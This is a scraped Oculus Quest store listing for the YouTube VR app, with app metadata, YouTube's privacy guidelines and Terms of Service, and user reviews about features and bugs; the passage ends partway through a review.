{"App Title": "YouTube VR", "App description": "Experience your favorite YouTube channels, videos and creators in virtual reality.\n\nThe YouTube VR app turns every video on the platform into your own virtual reality experience and reimagines YouTube as a 3D world you can explore from the inside. \n\nExperience YouTube like never before\n Explore every video on YouTube, from 3D 360 videos to standard rectangular videos\n Get the full, signed-in experience that lets you view subscriptions, playlists, watch history and more\n\nSee and hear it all\n Immerse yourself in full 360-degree videos that put you at the center of the action\n Experience spatial audio, where depth and distance play a role depending on where you look\n Switch between voice and keyboard controls to browse and search with ease\n\n\nPermission Notice\n Microphone: Needed to allow searching for YouTube content with your voice.", "Purchase section": "FreeAdd to WishlistShareComfortableSupports QuestSupports Oculus TouchInternet connection required", "Game Modes": "Single User", "Supported Player Modes": "Sitting, Standing, Roomscale", "Supported Controllers": "Oculus Touch", "Supported Platforms": "Quest", "Category": "Entertainment", "Genres": "360 Experience (non-game), Casual, Movie", "Languages": "English", "Version + Release Notes": "1.27.53", "Developer": "Google LLC", "Publisher": "Google LLC", "Website": "https://www.youtube.com/", "Release Date": "May 21, 2019", "Developer Privacy Policy": "YouTube Help\nSign in\nHelp CenterCommunity\nYouTube Get support\nFix a problemWatch videosManage your account & settingsJoin & manage YouTube PremiumCreate & grow your channelMonetize with the YouTube Partner ProgramPolicy, safety, and copyright\n\nFor the latest updates on how were addressing the coronavirus (COVID-19) situation, please visit g.co/yt-covid19, or subscribe here.\n\nYouTube Privacy Guidelines\nYouTube Privacy Guidelines\n\nWe're serious about protecting our users by addressing potential privacy concerns. Our privacy guidelines apply to all users across the world. In other words, while the video in question may not violate your country's privacy laws, it may still violate YouTube's privacy guidelines.\n\nHow does YouTube determine if content should be removed for a privacy violation?\n\nFor content to be considered for removal, an individual must be uniquely identifiable by image, voice, full name, government identification number, bank account number, contact information (e.g. home address, email address), or other uniquely identifiable information. We also take public interest, newsworthiness, and consent into account when determining if content should be removed for a privacy violation. YouTube reserves the right to make the final determination of whether a violation of its privacy guidelines has occurred.\n\nWhat does uniquely identifiable mean?\n\nTo be considered uniquely identifiable, there must be enough information in the video that allows others to recognize you. Please note that just because you can identify yourself within the video, it does not mean you are uniquely identifiable to others. A first name without additional context or a fleeting image, for example, would not likely qualify as uniquely identifiable.\n\nHow YouTube's privacy process works\n\nIf a privacy complaint is filed, YouTube may provide the uploader an opportunity to remove or edit the private information within their video. We issue notification of the potential violation and provide the uploader 48 hours to take action on the complaint. If the uploader removes the video during these 48 hours, the complaint filed will be closed. If the potential privacy violation remains on the site after 48 hours, the YouTube Team will then review the complaint.\n\nOur Privacy Complaint Process also accounts for cases that warrant urgent removal of contact or financial data.\n\nReporting a privacy violation\n\nTo file a privacy complaint, start the Privacy Complaint Process. As the complainant, your privacy is respected in this process. At no point will your identity or contact information be released to the uploader without your consent. Our communications to you about this process will be sent to the email address you provide to us. Add support@youtube.com to your spam filter to ensure you receive these messages.\n\nFirst-party claims are required.\n\nWe do not accept claims made on behalf of third parties except in the following situations:\n\nthe individual whose privacy is being violated does not have access to a computer\nthe individual whose privacy is being violated is a vulnerable individual\nthe claim is being made by the parent or legal guardian of the individual whose privacy is being violated\nthe claim is being made by a legal representative for the individual whose privacy is being violated\n\nWe will not accept privacy complaints filed on behalf of:\n\nother family members (e.g., husband, wife, cousin, brother, sister)\nco-workers or employees (individuals must submit a report themselves)\na company\n\nTips on filing a complete privacy complaint\n\nPlease be clear and concise so that the YouTube Team can identify you within the video.\nUsetime stamps to indicate only one or two places where you clearly appear in the video.\nIn the description area, please specify what you are wearing or doing that differentiates you from others within the video.\nMake sure you've included the video URL in your report. You are not required to submit a URL if you are reporting an entire channel.\nIf you are reporting a comment made in the comments section of a video, please note this in the description area. Include the commenter's username in the username field.\nReceiving notice of a privacy violation\n\nYouTube may provide you, the uploader, an opportunity to remove or edit the private information within your video. In this case, we would email you about the potential violation and allow you 48 hours to take action on the complaint. If you remove the alleged violation from the site within the 48 hours, the complaint filed will then be closed. If the potential privacy violation remains on the site after 48 hours, the complaint will be reviewed by the YouTube Team.\nIf we remove your video for a privacy violation, please do not upload another version featuring the same people. These individuals will likely file another privacy complaint or report you for harassment. We are serious about protecting our users and suspend accounts that violate people's privacy.\n\nHow can I address the complaint?\nYou can remove the reported content completely from the site.\nIf someone's full name or other personal information is listed within the title, description, or tags of your video, you can edit this by going to My Videos and clicking the Edit button on the reported video.\nYou can blur the faces of individuals who appear in the videos. \n\nIncomplete methods of removal are not acceptable, and include:\n\nMaking a video private as the uploader can change the status from private to public at any time.\nGive feedback about this article\nWas this helpful?YesNo\nPrivacy resources\nProtecting your identity\nDisable or enable Restricted Mode\nChange video privacy settings\nYour Data in YouTube\n2020 Google  Privacy Policy  YouTube Terms of Service English\nSend feedback on...\nThis help content & information\nGeneral Help Center experience\nTroubleshoot problems playing videos\nTroubleshoot account issues\nFix upload problems\nFix YouTube Premium membership issues\nGet help with the YouTube Partner Program\nFind videos to watch\nChange video settings\nWatch videos on different devices\nComment, subscribe, & connect with creators\nSave or share videos & playlists\nTroubleshoot problems playing videos\nPurchase and watch movies and TV shows\nSign up and manage your account\nManage account settings\nManage privacy settings\nManage accessibility settings\nTroubleshoot account issues\nLearn about YouTube Premium benefits\nManage Premium membership\nManage Premium billing\nGet a YouTube Premium family plan\nSign up for a student Premium membership\nFix YouTube Premium membership issues\nTroubleshoot billing & charge issues\nUpload videos\nEdit videos & video settings\nCustomize & manage your channel\nAnalyze performance with analytics\nTranslate videos & captions\nManage your community & comments\nLive stream on YouTube\nYouTube Partner Program Basics\nEarn money on YouTube\nGet help with the YouTube Partner Program\nUnderstand ad policies for advertisers\nYouTube for Content Managers\nYouTube policies\nReporting and enforcement\nPrivacy and safety center\nCopyright and rights management", "Developer Terms of Service": "Skip navigation\n Sign in\nSearch\nAbout Press & Blogs Copyright Safety Creators & Partners Advertising Developers Help\nTERMS OF SERVICE\nPaid Service Terms of Service\nPaid Service Usage Rules\nCollecting Society Notices\nCopyright Notices\nCommunity Guidelines\nTerms of Service\nOur Terms of Service have been updated.\n\nThis summary is designed to help you understand some of the key updates weve made to our Terms of Service (Terms). We hope this serves as a useful guide, but please ensure you read the new Terms in full.\n\nWelcome to YouTube!\n\nThis section outlines our relationship with you. It includes a description of the Service, defines our Agreement, and names your service provider. Key updates:\n\nService Provider. Your service provider is now Google LLC.\nPolicies. We have added a link to the Policy, Safety and Copyright Policies, and our Advertising on YouTube Policies, which all formpart of the Agreement. These are the policies that underpinour Community Guidelines, and we wanted to make sure to call out this detail to you upfront in our Terms.\nAffiliates. To ensureyou understand exactly who we mean when we talk about our group companies, weve included a definition of our Affiliates, meaning the companies in the Alphabet corporate group.\nWho May Use the Service?\n\nThis section sets out certain requirements for use of the Service, and defines categories of users. Key updates:\n\nAge Requirements.We have stated the specific age requirements for your country, reflectingour Google wide policies,and included a notice that, if you are a minor in your country, you must always have your parent or guardians permission before using the Service.\nParental Permission. Weve added a section to explain your responsibility if you allow your child to use YouTube.\nBusinesses. OurTerms now make clear that, if you are using the Service on behalf of a company or organisation, that business accepts this Agreement.\nYour Use of the Service\n\nThis section explains your rights to use the Service, and the conditions that apply to your use of the Service. It also explains how we may make changes to the Service. Key updates:\n\nGoogle Accounts and YouTube Channels. Weve provided details about which features of the Service can be accessed withouta Google accountor YouTube channel, and which features require one.\nYour Information. We havent made any changes to the way we treat your information. You can read about our privacy practices by reviewing the Privacy Policyand YouTube Kids PrivacyNotice. As a reminder, you can always review your privacy settings and manage your data and personalisation by visiting your Google Account.\nRestrictions. We have updated this section to reflect our requirements around contests, and to include a prohibition on manipulating metrics. \nService Changes.We have improved our Terms to be more transparent about why we might need to make changes to the Service,and provided a commitment to give you notice when those changes might affect you.\nYour Content and Conduct\n\nThis section applies to users who provide Content to the Service. It defines the scope of the permissions that you grant by uploading your Content, and includes your agreement not to upload anything that infringes on anyone elses rights.Key updates:\n\nLicense. Weve clarified the content license you grant us to make it easier to understand. Were not asking for additional permissions and theres no differencein how were using your content.\nDuration. We have removed the right for YouTube to use your comments in perpetuity.\nRemovals. We have included a linkto the tools you will need to remove your content, as well asa clear description about why we might need to take down content, and how toappeal removals.\nAnalyzing Content. We may automatically analyze content on YouTube, to help detect abuse and keep the platform safe.\nAccount Suspension and Termination\n\nThis section explains how you and YouTube may terminate this relationship. Key updates:\n\nTerminations. OurTerms now include more details about when we might need to terminate our Agreement with bad actors. We provide a greater commitment to give noticewhen we take such action and what you can do to appeal if you think weve got it wrong. Weve also added instructionsfor you, if you decide you no longer want to use the Service.\nAbout Software in the Service\n\nThis section includes details about software on the Service. Key updates:\n\nSoftware Licences.Weve made the software licence we grant you more specific, and included some details around open source.\nOther Legal Terms\n\nThis section includes ourservice commitment to you.It also explains that there are some things we will not be responsible for. Key updates:\n\nOur liability. Weve made changes to the disclaimers and limitations of liability in the Terms.\nAbout this Agreement\n\nThis section includes some further important details about our contract, including what to expect if we need to make changes to these Terms; or whichlaw applies to them. Key updates:\n\nModifications.We want to give you the chance to review future material updatesto these Terms.\n\nStill have questions?\n\nYou can also find further details in our Help Center.\n\n-----\n\nTerms of Service\n\nDated: December 10, 2019\n\nWelcome to YouTube!\n\nIntroduction\nThank you for using the YouTube platform and the products, services and features we make available to you as part of the platform (collectively, the Service). \n\nOur Service\n\nThe Service allows you to discover, watch and share videos and other content, provides a forum for people to connect, inform, and inspire others across the globe, and acts as a distribution platform for original content creators and advertisers large and small. We provide lots of information about our products and how to use them in our Help Center. Among other things, you can find out about YouTube Kids, the YouTube Partner Programand YouTube Paid Memberships and Purchases(where available).You can also read all about enjoying content on other deviceslike your television, your games console, or Google Home.\n\n\nYour Service Provider\n\nThe entity providing the Service is Google LLC, a company operating under the laws of Delaware, located at 1600 Amphitheatre Parkway, Mountain View, CA 94043(referred to as YouTube, we, us, or our). References to YouTubes Affiliates in these terms means the other companies within the Alphabet Inc. corporate group (now or in the future).\n\nApplicable Terms\nYour use of the Service is subject to these terms, the YouTube Community Guidelinesand the Policy, Safety and Copyright Policieswhich may be updated from time to time (together, this \"Agreement\"). Your Agreement with us will also include the Advertising on YouTube Policiesif you provide advertising or sponsorships to the Service or incorporate paid promotions in your content. Any other links or references provided in these terms are for informational use only and are not part of the Agreement.\n\nPlease read this Agreement carefully and make sure you understand it. If you do not understand the Agreement, or do not accept any part of it, then you may not use the Service.\n\nWho may use the Service?\n\nAge Requirements\nYou must be at least 13 years old to use the Service. However, children of all ages may use YouTube Kids (where available) if enabled by a parent or legal guardian.\n\nPermission by Parent or Guardian\n\nIf you areunder 18, you represent that you haveyourparent or guardians permission to use the Service. Please have them read this Agreement with you.\n\nIf you are a parent or legal guardian of a user under the age of 18, by allowing your child to use the Service, you are subject to the terms of this Agreement and responsible foryour childs activity on the Service. You can find tools and resources to help you manage your familys experience on YouTubein our Help Centerand through Googles Family Link.\n\nBusinesses\nIf you are using the Service on behalf of a company or organisation, you represent that you have authority to act on behalf of that entity, and that such entity accepts this Agreement.\n\nYour Use of the Service\n\nContent on the Service\nThe content on the Service includes videos, audio (for example music and other sounds), graphics, photos, text (such as comments and scripts), branding (including trade names, trademarks, service marks, or logos), interactive features, software, metrics, and other materials whether provided by you, YouTube or a third-party (collectively, \"Content).\n\nContent is the responsibility of the person or entity that provides it to the Service. YouTube is under no obligation to host or serve Content. If you see any Content you believe does not comply with this Agreement, including by violating the Community Guidelinesor the law, you can report it to us.\n\nGoogle Accounts and YouTube Channels\nYou can use parts of the Service, such as browsing and searching for Content,without having a Google account. However, you do need a Google account to use some features. With a Google account, you may be able to like videos, subscribe to channels, create your own YouTube channel, and more. You can follow these instructions to create a Google account.\n\nCreatinga YouTube channel will give you access to additional features and functions, such as uploading videos, making comments or creating playlists (where available). Here are some details about how to create your own YouTube channel.\n\nTo protect your Google account, keep your password confidential. You should not reuse your Google account password on third-party applications. Learn more about keeping your Google account secure, including what to do if you learn of any unauthorised use of your password or Google account.\n\nYour Information\nOur Privacy Policyexplains how we treat your personal data and protect your privacy when you use the Service. The YouTube Kids Privacy Noticeprovides additional information about our privacy practices that are specific to YouTube Kids.\n\nWe will process any audio or audiovisual content uploaded by you to the Service in accordance with the YouTube Data Processing Terms, except in cases where you uploaded such content for personal purposes or household activities. Learn More.\n\nPermissions and Restrictions\nYou may access and use the Service as made available to you, as long as you comply with this Agreement and applicable law. You may view or listen to Content for your personal, non-commercial use. You may also show YouTube videos through the embeddable YouTube player.\n\nThe following restrictions apply to your use of the Service. You are not allowed to:\n\naccess, reproduce, download, distribute, transmit, broadcast, display, sell, license, alter, modify or otherwise use any part of the Service or any Content except: (a) as expressly authorized by the Service; or (b) with prior written permission from YouTube and, if applicable, the respective rights holders;\ncircumvent, disable, fraudulently engage with, or otherwise interfere with any part of the Service (or attempt to do any of these things), including security-related features or features that (a) prevent or restrict the copying or other use of Content or (b) limit the use of the Service or Content;\naccess the Service using any automated means (such as robots, botnets or scrapers) except (a) in the case of public search engines, in accordance with YouTubes robots.txt file; or (b) with YouTubes prior written permission;\ncollect or harvest any information that might identify a person (for example, usernames), unless permitted by that person or allowed under section (3) above;\nuse the Service to distribute unsolicited promotional or commercial content or other unwanted or mass solicitations;\ncause or encourage any inaccurate measurements of genuine user engagement with the Service, including by paying people or providing them with incentives to increase a videos views, likes, or dislikes, or to increase a channels subscribers, or otherwise manipulate metrics in any manner;\nmisuse any reporting, flagging, complaint, dispute, or appeals process, including by making groundless, vexatious, or frivolous submissions;\nrun contests on or through the Service that do not comply with YouTubes contest policies and guidelines;\nuse the Service toview or listen to Content other than for personal, non-commercial use (for example, you may not publicly screen videos or stream music from the Service); or\nuse the Service to (a) sell any advertising, sponsorships, or promotions placed on, around, or within the Service or Content, other than those allowed in the Advertising on YouTubepolicies (such as compliant product placements); or (b) sell advertising, sponsorships, or promotions on any page of any website or application that only contains Content from the Service or where Content from the Service is the primary basis for such sales (for example, selling ads on a webpage where YouTube videos are the main draw for users visiting the webpage).\n\nReservation\n\nUsing the Service does not give you ownership of or rights to any aspect of the Service, including user names or any other Content posted by others or YouTube.\n\nChanges to the Service\n\nYouTube is constantly changing and improving the Service. We may also need to alter or discontinue the Service, or any part of it, in order to make performance or security improvements, change functionality and features, make changes to comply with law, or prevent illegal activities on or abuse of our systems. These changes may affect all users, some users or even an individual user. Whenever reasonably possible, we will provide notice when we discontinue or make material changes to our Service that will have an adverse impact on the use of our Service.However, you understand and agree that there will be times when we make such changes without notice, such as where we feel we need to take action to improve the security and operability of our Service, prevent abuse, or comply with legal requirements.\n\nYour Content and Conduct\n\nUploading Content\n\nIf you have a YouTube channel, you may be able to upload Content to the Service. You may use your Content to promote your business or artistic enterprise. If you choose to upload Content, you must not submit to the Service any Content that does not comply with this Agreement (including the YouTube Community Guidelines) or the law. For example, the Content you submit must not include third-party intellectual property (such as copyrighted material) unless you have permission from that party or are otherwise legally entitled to do so. You are legally responsible for the Content you submit to the Service. We may use automated systems that analyze your Content to help detect infringement and abuse, such as spam, malware, and illegal content.\n\nRights you Grant\n\nYou retain ownership rights inyour Content. However, we do require you to grant certain rights to YouTube and other users of the Service, as described below.\n\nLicense to YouTube\n\nBy providing Content to the Service, you grant to YouTube a worldwide, non-exclusive, royalty-free, sublicensable and transferable license to use that Content (including to reproduce, distribute, prepare derivative works,display and perform it) in connection with the Service and YouTubes (and its successors' and Affiliates') business, including for the purpose of promoting and redistributing part or all of the Service.\n\nLicense to Other Users\n\nYou also grant each other user of the Service a worldwide, non-exclusive, royalty-free license to access your Content through the Service, and to use that Content, including to reproduce, distribute, prepare derivative works, display, and perform it, only as enabled by a feature of the Service (such as video playback or embeds). For clarity, this license does not grant any rights or permissions for a user to make use of your Content independent of the Service.\n\nDuration of License\n\nThe licenses granted by you continue for a commercially reasonable period of time after you remove or delete your Content from the Service. You understand and agree, however, that YouTube may retain, but not display, distribute, or perform, server copies of your videos that have been removed or deleted.\n\nRemoving Your Content\n\nYou may remove your Content from the Service at any time. You also have the option to make a copy of your Content before removing it. You must remove your Content if you no longer have the rights required by these terms.\n\nRemoval of Content By YouTube\n\nIf we reasonably believe that any Content is in breach of this Agreement ormay cause harm to YouTube, our users, or third parties, we may remove or take down that Content in our discretion.We will notify you with the reason for our action unless we reasonably believe that to do so: (a) would breach the law or the direction of a legal enforcement authority or would otherwise risk legal liability for YouTube or our Affiliates; (b) would compromise an investigation or the integrity or operation of the Service; or (c) would cause harm to any user, other third party, YouTube or our Affiliates. You can learn more about reporting and enforcement, including how to appeal on the Troubleshootingpage of our Help Center.\n\nCopyright Protection\n\nWe provide information to help copyright holders manage their intellectual property online in our YouTube Copyright Center. If you believe your copyright has been infringed on the Service, please send us a notice.\n\nWe respond to notices of alleged copyright infringement according to the process in our YouTube Copyright Center, where you can also find information about how to resolve a copyright strike. YouTube's policies provide for the termination, in appropriate circumstances, of repeat infringers access to the Service.\n\nAccount Suspension & Termination\n\nTerminations by You\nYou may stop using the Service at any time. Follow these instructionsto delete the Service from your Google Account, which involves closing your YouTube channel and removing your data. You also have the option to downloada copyof your datafirst.\n\nTerminations and Suspensions by YouTube for Cause\n\nYouTubemay suspend or terminate your access, your Google account, or your Google accounts access to all or part of the Serviceif (a) you materially or repeatedly breach this Agreement;(b) we are required to do so to comply with a legal requirement or a court order; or (c) we believe there has been conduct that creates (or could create) liability or harm to any user, other third party, YouTube or our Affiliates.\n\n\nTerminations by YouTube for Service Changes\n\nYouTube may terminate your access, or your Google accounts access to all or part of the Service if YouTube believes, in its sole discretion, that provision of the Service to you is no longer commercially viable.\n\nNotice for Termination or Suspension\n\nWe will notify you with the reason for termination or suspension by YouTube unless we reasonably believe that to do so: (a) would violate the law or the direction of a legal enforcement authority, or would otherwise risk legal liability for YouTube or our Affiliates; (b) would compromise an investigation or the integrity or operation of the Service; or (c) would cause harm to any user, other third party, YouTube or our Affiliates. Where YouTube is terminating your access for Service changes, where reasonably possible, you will be provided with sufficient time to export your Content from the Service.\n\nEffect of Account Suspension or Termination\n\nIf your Google account is terminated or your Google accounts access to the Service is restricted, you may continue using certain aspects of the Service (such as viewing only) without an account, and this Agreement will continue to apply to such use. If you believe your Google account has been terminated in error, you can appeal using this form.\n\nAbout Software in the Service\n\nDownloadable Software\nWhen the Service requires or includes downloadable software (such as the YouTube Studio application), you give permission for that software to update automatically on your device once a new version or feature is available, subject to your device settings. Unless that software is governed by additional terms which provide a license, YouTube gives you a personal, worldwide, royalty-free, non-assignable and non-exclusive license to use the software provided to you by YouTube as part of the Service. This license is for the sole purpose of enabling you to use and enjoy the benefit of the Service as provided by YouTube, in the manner permitted by this Agreement. You are not allowed to copy, modify, distribute, sell, or lease any part of the software, or to reverse-engineer or attempt to extract the source code of that software, unless laws prohibit these restrictions or you have YouTubes written permission.\n\nOpen Source\nSome software used in our Service may be offered under an open source license that we make available to you. There may be provisions in an open source license that expressly override some of these terms, so please be sure to read those licenses. \n\nOther Legal Terms\n\nWarranty Disclaimer\nOTHER THAN AS EXPRESSLY STATED IN THIS AGREEMENT OR AS REQUIRED BY LAW, THE SERVICE IS PROVIDED AS IS AND YOUTUBE DOES NOT MAKE ANY SPECIFIC COMMITMENTS OR WARRANTIES ABOUT THE SERVICE. FOR EXAMPLE, WE DONT MAKE ANY WARRANTIES ABOUT: (A) THE CONTENT PROVIDED THROUGH THE SERVICE; (B) THE SPECIFIC FEATURES OF THE SERVICE, OR ITS ACCURACY, RELIABILITY, AVAILABILITY, OR ABILITY TO MEET YOUR NEEDS; OR (C) THAT ANY CONTENT YOU SUBMIT WILL BE ACCESSIBLE ON THE SERVICE. \n\nLimitation of Liability\n\nEXCEPT AS REQUIRED BY APPLICABLE LAW, YOUTUBE,ITS AFFILIATES, OFFICERS, DIRECTORS, EMPLOYEES ANDAGENTS WILL NOT BE RESPONSIBLE FORANY LOSS OF PROFITS, REVENUES, BUSINESS OPPORTUNITIES, GOODWILL, OR ANTICIPATED SAVINGS; LOSS OR CORRUPTION OF DATA; INDIRECT OR CONSEQUENTIAL LOSS; PUNITIVE DAMAGES CAUSED BY:\n\nERRORS, MISTAKES, OR INACCURACIES ON THE SERVICE;\nPERSONAL INJURY OR PROPERTY DAMAGE RESULTING FROM YOUR USE OF THE SERVICE;\nANY UNAUTHORIZED ACCESS TO OR USE OF THE SERVICE;\nANY INTERRUPTION OR CESSATION OF THE SERVICE;\nANY VIRUSES OR MALICIOUS CODE TRANSMITTED TO OR THROUGH THE SERVICE BY ANY THIRD PARTY;\nANY CONTENT WHETHER SUBMITTED BY A USER OR YOUTUBE, INCLUDING YOUR USE OF CONTENT; AND/OR\nTHE REMOVAL OR UNAVAILABILITY OF ANY CONTENT.\n\nTHIS PROVISION APPLIES TO ANY CLAIM, REGARDLESS OF WHETHER THE CLAIM ASSERTED IS BASED ON WARRANTY, CONTRACT, TORT, OR ANY OTHER LEGAL THEORY.\n\nYOUTUBE AND ITS AFFILIATES TOTAL LIABILITY FOR ANY CLAIMS ARISING FROM OR RELATING TO THE SERVICE IS LIMITED TO THE GREATER OF: (A) THE AMOUNT OF REVENUE THAT YOUTUBE HAS PAID TO YOU FROM YOUR USE OF THE SERVICE IN THE 12 MONTHS BEFORE THE DATE OF YOUR NOTICE, IN WRITING TO YOUTUBE, OF THE CLAIM; AND (B) USD $500.\n\nIndemnity\n\nTo the extent permitted by applicable law, you agree to defend, indemnify and hold harmless YouTube, its Affiliates, officers, directors, employees and agents, from and against any and all claims, damages, obligations, losses, liabilities, costs or debt, and expenses (including but not limited to attorney's fees) arising from: (i) your use of and access to the Service; (ii) your violation of any term of this Agreement; (iii) your violation of any third party right, including without limitation any copyright, property, or privacy right; or (iv) any claim that your Content caused damage to a third party. This defense and indemnification obligation will survive this Agreement and your use of the Service.\n\nThird-Party Links\nThe Service may contain links to third-party websites and online services that are not owned or controlled by YouTube. YouTube has no control over, and assumes no responsibility for, such websites and online services. Be aware when you leave the Service; we suggest you read the terms and privacy policy of each third-party website and online service that you visit.\n\nAbout this Agreement\n\nModifying this Agreement\nWe may modify this Agreement, for example, to reflect changes to our Service or for legal, regulatory, or security reasons. YouTube will provide reasonable advance noticeofany material modifications to this Agreement and the opportunity to review them, except that modifications addressing newly available features of the Service or modifications made for legal reasons may be effective immediately without notice. Modifications to this Agreement will only apply going forward. If you do not agree to the modified terms, you should remove any Content you have uploaded and discontinue your use of the Service.\n\nContinuation of this Agreement\nIf your use of the Service ends, the following terms of this Agreement will continue to apply to you: Other Legal Terms, About This Agreement, and the licenses granted by you will continue as described under Duration of License.\n\nSeverance\nIf it turns out that a particular term of this Agreement is not enforceable for any reason, this will not affect any other terms.\n\nNo Waiver\nIf you fail to comply with this Agreement and we do not take immediate action, this does not mean that we are giving up any rights that we may have (such as the right to take action in the future).\n\nInterpretation\n\nIn these terms, include or including means including but not limited to, and any examples we give are for illustrative purposes.\n\nGoverning Law\nAll claims arising out of or relating to these terms or the Service will be governed by California law, except Californias conflict of laws rules, and will be litigated exclusively in the federal or state courts of Santa Clara County, California, USA. You and YouTube consent to personal jurisdiction in those courts.\n\nLimitation on Legal Action\n\nYOU AND YOUTUBE AGREE THAT ANY CAUSE OF ACTION ARISING OUT OF OR RELATED TO THE SERVICES MUST COMMENCE WITHIN ONE (1) YEAR AFTER THE CAUSE OF ACTION ACCRUES. OTHERWISE, SUCH CAUSE OF ACTION IS PERMANENTLY BARRED.\n\nEffective as of December 10, 2019 (view previous version)\n  Language: English  Location: United States  Restricted Mode: Off  History Help\nAbout Press Copyright Creators Advertise Developers\nTerms Privacy Policy & Safety Send feedback Test new features", "Space Required": "94.1 MB"}



["5 stars\n54%\n4 stars\n19%\n3 stars\n9%\n2 stars\n5%\n1 star\n13%", "RM2StaticJul 4 at 2:30 PM\nGood, Could Be Great!\n\nI like it and its easy to use. But, the one big frustration for me is I cannot change YouTube accounts. I have one main account and then have another use ID under that. On the \"regular\" Oculus browser I can log into YouTube and switch accounts. But I can't do that on this app. That is something that could be easily fixable.\n\nHelpful | 90", "bennybooquestJul 29 at 7:14 AM\nGreat, but...\n\nGraphics are great, videos load quickly, and its just very nice. The thing that put one star off of this review is that your controllers dont disappear. If you are in a 360 vr video, you can still see those gray controllers. If you readjust how your sitting or standing, if the controllers move, youll see them move in the video. Ive tried everything. There isnt a setting for this, and if you leave them inactive, it still doesnt disappear. Only choice you have is to put them somewhere else but if you have automatic hand tracking on it will turn on. But, thats very annoying. Its very frustrating to see controllers just sitting when you are in a 3D roller coaster. Really takes out the fun.\n\nHelpful | 15", "zoiks_ruhrohJul 17 at 11:56 AM\nMy main app\n\nI bought the Quest strictly to play games but that is something I rarely do now that I found youtube. The 360 videos are really entertaining and make you feel like you're there. My fav so far has been the herd of elephants coming over to check out the camera. I also enjoy taking tours of countries/cities that I normally wouldn't be able to travel to for one reason or another...good stuff!\n\nHelpful | 13", "jrico1Jun 25 at 10:18 AM\nThe vr 360 videos are amazing.\n\nI have toured paris, new york, egypt and a couple other nature sites and the videos are amazing. Other videos i have watched jumping out of an airplaine, viewing edge of space, space station overview. The videos do not disappoint. I have spent more time on youtube vr than any other quest app.\n\nHelpful | 16", "EurobuffJul 28 at 1:26 PM\nUpdate! - Oh Dear What Have You Done\n\nThis was a great app. Great to watch 3D and VR content and had a fantastic huge screen that could be re-sized to make it bigger / smaller and reposition it on the floor or ceiling if you wished. This app still has those features, but one huge mistake has been made in the update. Now you have a black progress/time bar on a black background, so have no idea where you are in the video you are playing. If you want to fast forward a minute, or 20 seconds or 2 minutes etc, you dont have any hope, as gone is the marker to show where you are in the video. Please fix what was a great app.\n\nHelpful | 7", "MistOfHorrorApr 26 at 8:47 PM\nFunctions Great on the Quest!\n\nWatching YouTube on the Quest is honestly pretty cool. It feels like you're in your own personal theater experiencing the videos you like. It gets you really immersed and is honestly better than watching YouTube on other devices mainly because there are hardly any distractions stopping you. I just wish that you could invite a friend to watch the same video you're watching. 9/10\n\nHelpful | 133", "RoreoOreo10 days ago\nGreat vr application\n\nI think this is a really good application and the only problem I have with it is that there is no virtual environment\n\nHelpful | 0", "misty3234Jul 17 at 5:07 PM\nExcellent\n\nHave to say I never knew YouTube had a VR section as well. I think it's absolutely perfect it has a huge selection of 180 360 VR and being able to access just YouTube I will be easily spending hours and hours enjoying this app it has so much to offer\n\nHelpful | 3", "slothman868 days ago\nGood but lacks basic features\n\nFunctionality is wonderful, but I'd really like a theater mode to turn of the pointer and controller renders so I can view the video without distracting pointers.\n\nI'd love to be able to leave and view comments as well.\n\nHelpful | 1", "WaffleManGuyJul 24 at 12:10 PM\nGood\n\nMake it so u can rotate the screen so I can watch it while lying down ty\n\nHelpful | 4", "goodwilliamJul 3 at 1:31 PM\nFeatures missing?\n\nUsing this app to watch videos is spectacular! But is there anyone know how to access the playlists or history? I know how to add a video into playlist. But when I want to play the added video once more, I need to access playlist or history.\n\nHelpful | 5", "alliberry3Jun 22 at 7:15 AM\nAwesome screen, party mode tough\n\nWatching YouTube videos on here is amazing! The screen is huge and the sound is great. I tried it in party mode though and we could barely hear each other over the video. Itd be helpful if we could control the sound of YouTube and party mode separately.\n\nHelpful | 2", "SmashedmouthJul 28 at 2:02 AM\nIts a really cool ideas but needs fixin\n\nIts a really cool app and I enjoy it but there is one thing that annoys me so when I open the app and watch a couple of videos I instantly noticed that there is screen flickering not on the tv but on the actual quest screen but when I get into a different app or go into my quest dome its gone I think it might be the actual app\n\nHelpful | 0", "sajisaka24 days ago\nterrible for no English speakers\n\nAs other reviewer says, this software will crash when you want to use IME.\nAnd this bug is remaining long time.\nSo, developer says \"No English speakers, no customers.\"\n\nP.S.\nFirefox VR corresponds WebXR so I don't need this app any more at this time.\nYou should use Firefox VR instead of Youtube VR.\n\nHelpful | 1", "tony.mas.73345Apr 20 at 7:39 AM\nMissing key features\n\nI love to watch Youtube in bed and this app allows me to do it as if i had a home theater above it.\n\nOn the other hand, it lacks some important features that Youtube has gotten us used to:\n\n- it is not possible to activate subtitles\n- you can't read the comments\n- you can't advance the video by 10 seconds like on the mobile application by double tapping\n- the quality seems to be less good too but i can't officially test this\n\nHelpful | 36", "IhatovoJul 20 at 6:31 AM\nAPP crushes when searching\n\nwhile searching in Japanese entire app crushed immediately. This bug has happened since May 2020 and not fixed yet.\nPlease fix this asap.\n\nHelpful | 6", "NS1595May 16 at 9:59 AM\nAmazing Breathtaking experience!\n\nI absolutely loved the Disneyland 360* rides! I really felt like I was on the ride - I even tripped a few times! The audio and the visual is extremely clear, its such a wonderful experience! I personally would recommend trying Disney 360* rides! As Disneyland has been closed due to the worldwide pandemic, you can still visit your favourite rides virtually!\n\nThis is an amazing app to use on Occulous quest, however, I would recommend extending it further and adding more options of videos to watch, similar to Netflix. Also, I would recommend adding a feature to adjust the brightness of the screen, since the light can be a little to bright after a while.\n\nThis is a great app for all ages, definitely recommend trying!\n\nHelpful | 12", "CaptainSkippaJun 28 at 3:31 PM\nCool!\n\nYT VR Is pretty neat. I just wish we could read and type comments. Four stars because I cant log in with my account. It says error every time and I cant find a solution anywhere.\n\nHelpful | 1", "Ker05beatbox12 days ago\nIts ok\n\nI cant connect to my YouTube account its to complicated for no reason\nOtherwise its good\n\nHelpful | 0", "imabanana8Jul 29 at 12:13 PM\nbest video app of 2020\n\nYou know what YouTube does its all that amazing stuff, but in vr. amazing video app great quality. I love it.\n\nHelpful | 1", "DAVE280869May 7 at 11:46 AM\nI bit buggy\n\nOk so when you go in the app it always says controller disconnected but then it isn't and you carry on playing videos as normal.\nI was wondering why it says that..\"controller disconnected\"...I've noticed you carn't record from within the app.... probably because of copyright issues.\n\nHelpful | 8", "KheHarish116Jul 2 at 7:02 PM\nBlurry\n\nHey, anyone else having video clarity while watching 360 videos ?\n\nI adjusted my headset, but that doesn't help\n\nHelpful | 2", "designbyshashaJul 2 at 5:15 AM\nNon-brainier, a must have\n\nJust get 